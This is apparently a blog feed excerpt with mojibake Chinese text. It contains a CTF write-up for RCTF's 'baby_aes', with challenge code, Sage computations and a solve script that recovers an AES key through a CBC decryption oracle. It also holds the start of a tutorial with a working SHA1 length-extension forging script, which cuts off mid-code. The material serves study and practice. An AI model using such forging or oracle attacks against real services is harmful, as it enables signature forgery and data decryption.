title="baby_aes"></a>baby_aes</h2><p>è¿™é¢˜æ¯”è¾ƒæœ‰æ„æ€, æ“ä½œè¿˜æ˜¯æ¯”è¾ƒç¡¬æ ¸çš„, ä¸»è¦é€»è¾‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">Ke = init(K)</span><br><span class="line"></span><br><span class="line">backend = default_backend()</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = encrypt(key, Ke)</span><br><span class="line">cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">decryptor = cipher.decryptor()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Input a hexstr to decrypt:"</span>)</span><br><span class="line">    data = sys.stdin.readline().strip()</span><br><span class="line">    ciphertext = binascii.unhexlify(data)</span><br><span class="line">    plaintext = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    print(<span class="string">"Decrypted result:"</span>)</span><br><span class="line">    print(binascii.hexlify(plaintext).decode())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">    padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">    flag_padded = padder.update(flag) + padder.finalize()</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    flag_encrypted = encryptor.update(flag_padded) + encryptor.finalize()</span><br><span class="line">    print(<span class="string">"Your encrypted flag is:"</span>)</span><br><span class="line">    print(binascii.hexlify(flag_encrypted).decode())</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>init</code> å‡½æ•°æ˜¯ AES ç§˜é’¥æ‰©å±•, <code>encrypt</code> æ˜¯ AES è½®å‡½æ•°, ä½†æ˜¯æ”¹å˜äº† AES åŸæ¥çš„å¸¸æ•°, è¿™ä¸¤ä¸ªå‡½æ•°ä¹Ÿæ˜¯æœ¬é¢˜çš„æ ¸å¿ƒ, æˆ‘ä»¬ç•™åˆ°åé¢è®². è¿™é‡Œå‡è®¾æˆ‘ä»¬å·²ç»å†™å‡ºå¯¹åº”çš„è§£å¯†å‡½æ•°,</p><p>çœ‹åˆ° <code>iv = encrypt(key, Ke)</code>, å¯ä»¥çœ‹åˆ° iv å°±æ˜¯ key çš„åŠ å¯†, åªè¦æˆ‘ä»¬èƒ½è·å¾— <code>iv</code>, å°±èƒ½è§£å¯†å‡º <code>key</code>, ä»è€Œè§£å¯†å¾—åˆ° <code>flag</code>.</p><p>æ³¨æ„åˆ°è¿™é‡Œæ˜¯ç”¨ AES è§£å¯†è¾“å…¥çš„æ•°æ®, ç»“åˆ CBC æ¨¡å¼</p><p><img src="https://i.loli.net/2019/05/19/5ce17ac53478934702.png" alt="CBC"></p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸¤ä¸ªç›¸åŒåˆ†å—(b1 + b1â€™)é•¿åº¦çš„æ•°æ®, å…¶ä¸­è§£å¯†ç»“æœçš„ç¬¬äºŒå—(o2)æ˜¯è¿™æ ·ç®—å‡ºæ¥çš„<br><code>xor(AESdec(b1&#39;), b1) = o2</code><br>è€Œ <code>o2</code>, <code>b1</code> éƒ½æ˜¯å·²çŸ¥çš„, æˆ‘ä»¬å°±å¯ä»¥è§£å‡º <code>AESdec(b1)</code>, å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„ä¸¤ä¸ªåˆ†å—ç›¸åŒ,<br>æˆ‘ä»¬å°† <code>AESdec(b1)</code> ä¸ <code>o1</code> xor ä¸€ä¸‹, å°±èƒ½å¾—åˆ° <code>iv</code>, è¿™æ—¶åªè¦ç”¨ <code>K</code> è§£å¯† <code>iv</code> å°±èƒ½å¾—åˆ° <code>key</code><br>ä»è€Œè§£å¯† <code>flag</code>.</p><p>ä½†é—®é¢˜å°±æ˜¯è¿™é‡Œå‡ºé¢˜äººé­”æ”¹äº† AES, ä¸èƒ½ç›´æ¥è§£å¯†, è¿™é‡Œæœ€å¥½è‡ªå·±å†™è¿‡ä¸€é AES çš„å®ç°, å¦åˆ™æ¥ä¸‹æ¥æœ‰äº›éƒ¨åˆ†å¯èƒ½ä¸å¤ªæ–¹ä¾¿,<br>é¦–å…ˆå¯ä»¥æœåˆ°ä½œè€…é­”æ”¹çš„<a href="https://github.com/ricmoo/pyaes/blob/master/pyaes/aes.py" target="_blank" rel="noopener">åŸä»£ç </a><br>å¯ä»¥çœ‹åˆ° Sbox, T1-4 éƒ½è¢«ä¿®æ”¹, å¹¶ä¸”æ²¡æœ‰ç»™å‡ºå¯¹åº”çš„é€†å˜æ¢</p><p><code>S = [0x63, 0x7c, 0x77, 0x7....</code> &lt;-åŸæ¥çš„<br><code>S = [0x93 ,0x43 ,0x5D ,0x6....</code> &lt;-é­”æ”¹ä¹‹åçš„</p><p>ä½†æ˜¯ä» <code>rcon = [....0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91 ]</code> è¿™æœ€åå‡ ä¸ª<br>æ•°æ®å¯ä»¥çœ‹å‡º, ä»ç„¶è¿˜æ˜¯åœ¨ <code>GF(2^8) mod x^8 + x^4 + x^3 + x + 1</code> ä¸Šçš„, å¦åˆ™ 0xc5 * 2 ä¸ä¼šç­‰äº 0x91</p><p>æ‰€ä»¥è¿™é‡Œåº”è¯¥åªæ˜¯å•çº¯çš„æ”¹äº† Sbox, ä¸æ˜¯æ”¹å…¶ä»–å¸¸æ•°å¸¦æ¥çš„å‰¯ä½œç”¨.</p><p>æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ° T è¢«å®Œå…¨ä¿®æ”¹äº†, é¦–å…ˆäº†è§£ä¸€ä¸‹ T å˜æ¢æ˜¯å¹²å˜›çš„,<br>è¿™é‡Œå€Ÿä¸€å¼ å›¾è¯´æ˜<br><img src="https://i.loli.net/2019/05/22/5ce5502037ede37184.png" alt=""></p><p>æ³¨: ShiftRow ä¸ ByteSub ä¹‹é—´çš„é¡ºåºä¸æ•æ„Ÿ, å¯ä»¥åœ¨è¿›å…¥å˜æ¢ä¹‹å‰å°± ShiftRow å¥½, å°±è·Ÿä¸Šå›¾ä¸€æ ·, å–çš„ä¸æ˜¯åŸçŸ©é˜µçš„ä¸€è¡Œ, è€Œæ˜¯ ShiftRow ä¹‹åçŸ©é˜µçš„ä¸€è¡Œ</p><p>T å˜æ¢æ˜¯ç»“åˆäº† ByteSub MixColumn, å°† AES è½®å‡½æ•°ä¸­çš„ä¸¤æ­¥å¹¶åˆ°ä¸€èµ·, åŠ é€Ÿæ•ˆç‡çš„ä¸€ç§æ–¹æ³•, å¦‚æœæŒ‰ç…§åŸæ¥çš„çŸ©é˜µä¹˜æ³•<br><img src="https://i.loli.net/2019/05/22/5ce551bb6234249389.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d0 &#x3D; 2 * ByteSub(b0) + 3 * ByteSub(b1) + 1 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d1 &#x3D; 1 * ByteSub(b0) + 2 * ByteSub(b1) + 3 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d2 &#x3D; 1 * ByteSub(b0) + 1 * ByteSub(b1) + 2 * ByteSub(b2) + 3 * ByteSub(b3)</span><br><span class="line">d3 &#x3D; 3 * ByteSub(b0) + 1 * ByteSub(b1) + 1 * ByteSub(b2) + 2 * ByteSub(b3)</span><br></pre></td></tr></table></figure><p>ç®—èµ·æ¥éå¸¸çš„éº»çƒ¦, ä½†æ˜¯çœ‹åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">3 * ByteSub(b0)</span><br></pre></td></tr></table></figure><p>å¯ä»¥æƒ³åˆ°è¿™ç»“æ„å®Œå…¨æ˜¯å›ºå®šçš„, å› ä¸ºåŠ å¯†çš„æ˜¯å­—èŠ‚, å®šä¹‰åŸŸæ˜¯ 0-255, å®Œå…¨å¯ä»¥å°† 0-255 çš„å€¼å¸¦å…¥ b0, å°†æ‰€æœ‰å€¼æå‰ç®—å‡º, å¹¶æˆ 4 ä¸ªå­—èŠ‚, åœ¨ä½¿ç”¨æ—¶æŸ¥è¡¨å°±è¡Œ, å¤§å¤§æé«˜æ•ˆç‡. å› ä¸º GF(2^8) ä¸Šçš„åŠ æ³•å®é™…ä¸Šå°±æ˜¯ xor, æ‰€ä»¥</p><p><code>MixColumn(ByteSub(b0 b1 b2 b3)) = T1[b0] xor T2[b1] xor T3[b2] xor T4[b3]</code></p><p>åœ¨æœ¬é¢˜ä¸­, å‡è®¾è¿›å…¥è½®å‡½æ•°ä¹‹å‰ state å…¨æ˜¯ 0, é‚£ä¹ˆè¿™é‡ŒæŸ¥è¡¨å¯ä»¥ç›´æ¥ä¸€æ­¥åˆ°ä½ <code>T1[0] ^ T2[0] ^ T3[0] ^ T4[0] = 0xaeaeaeae</code>, è€ŒæŒ‰ç…§åŸåˆ—æ··åˆçš„çŸ©é˜µç®—ç­‰äº <code>0x93939393</code> è¯´æ˜åˆ—æ··åˆçš„çŸ©é˜µä¹Ÿè¢«ä¿®æ”¹, è¿™å°±æ¯”è¾ƒéº»çƒ¦äº†, éœ€è¦ç”¨ä¸€ä¸‹ <code>sage</code>.</p><p>å› ä¸ºå‡è®¾è¾“å…¥è½®å‡½æ•°çš„ state å…¨æ˜¯ 0ï¼Œ é‚£ä¹ˆ subByte çš„å¾—åˆ°çš„æ˜¯ 0x93, è€Œ <code>T[0] = 0xF467D4E9</code>, åŸ AES çš„å› æ•°æ˜¯ <code>(2, 3, 1, 1)</code>, è¿™é‡Œæˆ‘ä»¬å‡è®¾é­”æ”¹ä¹‹åçš„æ˜¯ <code>(cofe[0], cofe[1], cofe[2], cofe[3])</code></p><p>æŒ‰ç…§ä¸Šé¢ T å˜æ¢çš„å®šä¹‰, <code>T[0]</code> æ˜¯è¿™ä¹ˆæ¥çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cofe[0] * b0</span><br><span class="line">cofe[3] * b0</span><br><span class="line">cofe[2] * b0</span><br><span class="line">cofe[1] * b0</span><br></pre></td></tr></table></figure><p>è€Œæœ¬é¢˜ <code>T[0] = 0xF467D4E9</code> å¯ä»¥å†™å‡º<br><code>0x93 * cofe[0] = 0xF4</code>,  <code>0x93 * cofe[3] = 0x67</code>, <code>0x93 * cofe[2] = 0xD4</code>, <code>0x93 * cofe[1] = 0xE9</code>,<br>åœ¨ 0-255 çš„èŒƒå›´å†…çˆ†ç ´ä¸‹,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sage: F.&lt;x&gt; &#x3D; GF(2^8, modulus&#x3D;[1,1,0,1,1,0,0,0,1])</span><br><span class="line">sage: F.modulus()</span><br><span class="line">x^8 + x^4 + x^3 + x + 1</span><br><span class="line">sage: def f(num):</span><br><span class="line">....:     global F</span><br><span class="line">....:     return F.fetch_int(num)</span><br><span class="line">....:</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xf4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">8</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0x67):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">9</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xd4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">7</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xe9):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå››ä¸ªå› æ•°æ˜¯ <code>(8, 5, 7, 9)</code>, è¿˜åŸæˆçŸ©é˜µæ±‚ GF(2^8) ä¸Šçš„é€†çŸ©é˜µ, å†ç”¨ä¸€ä¸‹ <code>sage</code>, å½“ç„¶å¦‚æœæ˜¯å¤§ä½¬å¯ä»¥æ‰‹ç®— _(:Ğ·ã€âˆ )_</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sage: c &#x3D; matrix(F, [[f(8), f(5), f(7), f(9)], [f(9), f(8), f(5), f(7)], [f(7), f(9), f(8), f(5)], [f(5), f(7), f(9), f(8)]])</span><br><span class="line">sage: c.inverse()</span><br><span class="line">[      x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1]</span><br><span class="line">[x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1]</span><br><span class="line">[      x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3]</span><br><span class="line">[          x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x]</span><br></pre></td></tr></table></figure><p>è½¬æ¢å›æ•°å­—è¡¨ç¤ºå°±æ˜¯<br><code>cofes = (150, 200, 149, 61)</code><br>å¸¦è¿› invMixColumn å°±å¯ä»¥æ­£ç¡®è§£å¯†å•¦, å¦‚æœæ²¡æœ‰è‡ªå·±å†™è¿‡çš„è¯, å¯ä»¥å‚è€ƒæˆ‘å†™çš„<a href="https://github.com/rmb122/Cryptography/blob/master/AES-128-CBC.py" target="_blank" rel="noopener">è¾£é¸¡å®ç°</a><br>ä¿®æ”¹ <code>mixColumn</code> å’Œ <code>invMixColumn</code> é‡Œé¢çš„ <code>polynomialMutil</code> å‡½æ•°ä¹˜çš„æ•°ä¸ºçŸ©é˜µå¯¹åº”ä½ç½®çš„æ•°å°±è¡Œäº†</p><p>æ—¢ç„¶ç°åœ¨å¯ä»¥è§£å¯†, æŒ‰ç€ä¸Šé¢çš„æ€è·¯å°±èƒ½æ‹¿ <code>flag</code> äº†~<br>æ¥ä¸‹æ¥ nc ä¸€ä¸‹, è¾“å…¥ 16 ä¸ª 1,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input a hexstr to decrypt:</span><br><span class="line">3131313131313131313131313131313131313131313131313131313131313131</span><br><span class="line">Decrypted result:</span><br><span class="line">3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c</span><br><span class="line">Your encrypted flag is:</span><br><span class="line">c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES <span class="keyword">as</span> stdAES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">hexstr = <span class="string">'11111111111111111111111111111111'</span>.encode()</span><br><span class="line">dec = unhexlify(<span class="string">'3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c'</span>)</span><br><span class="line">midVal = strxor(dec[<span class="number">16</span>:<span class="number">32</span>], hexstr[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">iv = strxor(dec[<span class="number">0</span>:<span class="number">16</span>], midVal)</span><br><span class="line">aes = AES()</span><br><span class="line">key = aes.decryptBlock(iv, K)</span><br><span class="line">print(key)</span><br><span class="line">print(iv)</span><br><span class="line">flag = unhexlify(<span class="string">'c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812'</span>)</span><br><span class="line">stdaes = stdAES.new(key, stdAES.MODE_CBC, iv)</span><br><span class="line">print(stdaes.decrypt(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'N\t\x9c\xce*\xfa\xc1\x02\x94\xd1\x02\xf2\xb8d*E'</span></span><br><span class="line"><span class="string">b'\x11\xc5\xc2\xcck\x8e\x03\x0e\xe6&#123;\x1f\xb8\x93b\xc8\xc5'</span></span><br><span class="line"><span class="string">b'RCTF&#123;88358abe-e571-4bdf-95a3-93e9d8ddf558&#125;\x06\x06\x06\x06\x06\x06'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­æ±‚è§£, æ¯”ç›´æ¥çˆ†ç ´å››ä¸ªå› æ•°ä¼˜é›…å¾ˆå¤š, è€Œä¸”ä¹‹åé‡åˆ°ç±»ä¼¼é¢˜ç›®, ä¿®æ”¹åˆ—æ··åˆçš„å› æ•°, å¯ä»¥ç›´æ¥æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•é€šæ€</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¯†ç å­¦åªåšå‡ºæ¥ä¸¤é¢˜ baby, æš—ç¤ºæˆ‘è¿˜æ˜¯å­¦å¯†ç å­¦çš„ baby (é€ƒ&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>è‡ªåˆ¶ä¸€ä¸ªç®€å•çš„ Hashpump</title>
    <link href="https://rmb122.com/2019/05/11/%E8%87%AA%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-Hashpump/"/>
    <id>https://rmb122.com/2019/05/11/%E8%87%AA%E5%88%B6%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-Hashpump/</id>
    <published>2019-05-10T16:02:02.000Z</published>
    <updated>2019-07-22T01:47:16.148Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨å­¦å®Œ MD5/SHA1 ä¹‹å, å¾ˆå¿«å°±èƒ½ææ‡‚ <code>hashpump</code> çš„åŸç†, æœ¬è´¨æ˜¯å› ä¸ºç±» <code>MD</code> å“ˆå¸Œå‡½æ•°<br>åŒ…æ‹¬ MD5, SHA1, SHA2 éƒ½æ˜¯å°†ä¿¡æ¯å¡«å……ä¸ºä¸€ä¸ª <code>Block</code> é•¿åº¦çš„å€æ•°ä»¥ååˆ† <code>Block</code> ä¸€è½®è½®è®¡ç®—çš„,<br>æœ€åè¾“å‡ºçš„æ˜¯å¯„å­˜å™¨æ‹¼æ¥åœ¨ä¸€èµ·çš„å€¼, æ‰€ä»¥å‡è®¾ç”¨ä»¥ä¸‹å…¬å¼è®¡ç®—ç­¾å  </p><a id="more"></a><p>$$ hash(key + msg) = signature $$</p><p>å‡å¦‚å·²ç»çŸ¥é“äº† <code>signature</code>, <code>msg</code> ä»¥åŠ <code>key</code> çš„é•¿åº¦(åœ¨å®æˆ˜ä¸­å¯ä»¥çˆ†ç ´), é‚£ä¹ˆå®Œå…¨æ˜¯å¯ä»¥å°†æ‰€æœ‰ <code>Block</code> é‡Œé¢é™¤äº†<br>ä¸€å¼€å§‹çš„ key ä¹‹å¤–çš„çš„å†…å®¹ç®—å‡ºæ¥. è‡ªç„¶è€Œç„¶å¯ä»¥æƒ³åˆ°, æˆ‘ä»¬å°†è®¡ç®—å‡º <code>signature</code> æ—¶<br>çš„çŠ¶æ€ä½œä¸ºæˆ‘ä»¬çš„èµ·å§‹çŠ¶æ€, ä¹Ÿå°±æ˜¯å°†å¯„å­˜å™¨çš„å€¼æ¢æˆå“ˆå¸Œå‡½æ•°çš„è¾“å‡º, ç„¶åå°±å¯ä»¥åœ¨æ–°çš„ <code>Block</code><br>çš„é‡Œé¢ä¼ªé€ ä»»æ„æ¶ˆæ¯, å› ä¸ºè¿™æ—¶å€™å‰é¢ <code>Block</code> çš„å†…å®¹å®é™…ä¸Šåªæ˜¯ä¸ºäº† <code>padding</code> æœ€åçš„æ¶ˆæ¯é•¿åº¦çš„æ­£ç¡®,<br>æ‰€ä»¥å¯ä»¥åœ¨å¹¶åœ¨ä¸çŸ¥é“ <code>key</code> çš„æƒ…å†µä¸‹å¾—åˆ° <code>signature</code>. è¿™æ—¶ <code>msg</code> å°±å˜æˆäº†<br><code>åŸæ¥çš„ msg + padding + ä¼ªé€ çš„ msg</code>.  </p><p>é™åˆ¶å°±æ˜¯å¿…é¡»æ˜¯ <code>key + msg</code> çš„é¡ºåº, å¦‚æœæ˜¯ <code>msg + key</code> çš„é¡ºåº, ä¼ªé€ çš„ <code>msg</code> å°±å¿…é¡»æ˜¯<br><code>åŸæ¥çš„ msg + key + padding + ä¼ªé€ çš„ msg</code>, å‡ºç°äº† key, è€Œå¦‚æœæˆ‘ä»¬æœ‰ key äº†, è¿˜ä¼ªé€ ä»€ä¹ˆå‘¢ 233<br>æ‰€ä»¥å±€é™è¿˜æ˜¯æ¯”è¾ƒå¤§çš„, ä½†æ¼æ´æ€»æ˜¯å­˜åœ¨åœ¨å“ªé‡Œ, è¯´ä¸å®šå°±æœ‰å¼€å‘è€…ç”¨äº†å‘¢, å¯¹å§. æ‰€ä»¥æœ‰ä¸“é—¨çš„ <code>HMAC</code> ç®—æ³•<br>æ¥ç”Ÿæˆç­¾å, æŠ›å¼€ opad å’Œ ipad å•¥çš„, åŸç†å¾ˆç®€å•, å°±æ˜¯ç”¨  </p><p>$$ hash(key + hash(key + msg)) = signature $$</p><p>è¿™æ ·åµŒå¥—çš„æ–¹å¼æ¥è®¡ç®—ç­¾å, æ‹¿åˆ°çš„ç­¾åå€¼æ˜¯å¤–å±‚çš„ <code>hash</code> çš„ç»“æœ, è€Œå†…å±‚çš„ <code>hash(key + msg)</code> çš„å€¼é•¿åº¦æ˜¯ä¸å¯æ§çš„,<br>æ˜¾ç„¶å°±ä¸èƒ½é•¿åº¦æ‰©å±•äº†.  </p><p>äº†è§£è¿™äº›æ€è·¯, å†™è„šæœ¬å°±éå¸¸çš„ ez äº†. ç®€å•çš„å¯¹ <code>SHA1</code> çš„å“ˆå¸Œé•¿åº¦æ‰©å±•çš„è„šæœ¬å¦‚ä¸‹.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sha1 <span class="keyword">import</span> SHA1</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(msg)</span>:</span></span><br><span class="line">    length = len(msg)</span><br><span class="line">    pad = length % <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> pad &gt;= <span class="number">56</span>:</span><br><span class="line">        pad = (<span class="number">64</span> + <span class="number">56</span>) - pad</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pad = <span class="number">56</span> - pad</span><br><span class="line">    <span class="keyword">if</span> pad &gt; <span class="number">0</span>:</span><br><span class="line">        msg.extend([<span class="number">0x80</span>] + [<span class="number">0</span>] * (pad - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    length *= <span class="number">8</span></span><br><span class="line">    length = length % <span class="number">0x10000000000000000</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        b = (length &amp; <span class="number">0xff00000000000000</span>) &gt;&gt; <span class="number">56</span></span><br><span class="line">        length = length &lt;&lt; <span class="number">8</span></span><br><span class="line">        msg.append(b)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pump</span><span class="params">(orghash, orgmsg, keylen, addmsg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(orgmsg) == str:</span><br><span class="line">        orgmsg = orgmsg.encode()</span><br><span class="line">    <span class="keyword">if</span> type(addmsg) == str:</span><br><span class="line">        addmsg = addmsg.encode()</span><br><span class="line">    <span class="keyword">assert</span> len(orghash) == <span class="number">40</span>  <span class="comment"># sha1 20 å­—èŠ‚ç”¨ 16 è¿›åˆ¶è¡¨ç¤ºä¸º 40 ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class="line">    regs = unpack(<span class="string">'&gt;5I'</span>, unhexlify(orghash))  <span class="comment"># ç®—å‡ºä¹‹å‰è½®ç»“æŸçš„å¯„å­˜å™¨å€¼, SHA1 æ˜¯å¤§ç«¯å­˜å‚¨</span></span><br><span class="line"></span><br><span class="line">    sha1 = SHA1(<span class="string">''</span>)</span><br><span class="line">    sha1.ra, sha1.rb, sha1.rc, sha1.rd, sha1.re = regs</span><br><span class="line"></span><br><span class="line">    newmsg = bytearray()</span><br><span class="line">    newmsg += bytearray([<span class="number">0</span>] * keylen)</span><br><span class="line">    newmsg += bytearray(orgmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># è¿˜åŸ orghash çš„åŒºå—, key ç”¨ 0 æ¥å¡«å……</span></span><br><span class="line"></span><br><span class="line">    retmsg = newmsg[keylen:] <span class="comment"># è¿”å›çš„ msg</span></span><br><span class="line">    retmsg += bytearray(addmsg)</span><br><span class="line"></span><br><span class="line">    newmsg += bytearray(addmsg)</span><br><span class="line">    newmsg = padding(newmsg) <span class="comment"># å› ä¸ºæœ€å 8 ä½æ˜¯é•¿åº¦ä¿¡æ¯, æ‰€ä»¥å¾—å°†ä¹‹å‰çš„åŒºå—ä¸€å¹¶æ¥ padding</span></span><br><span class="line">    newmsg = newmsg[<span class="number">-64</span>:] <span class="comment"># 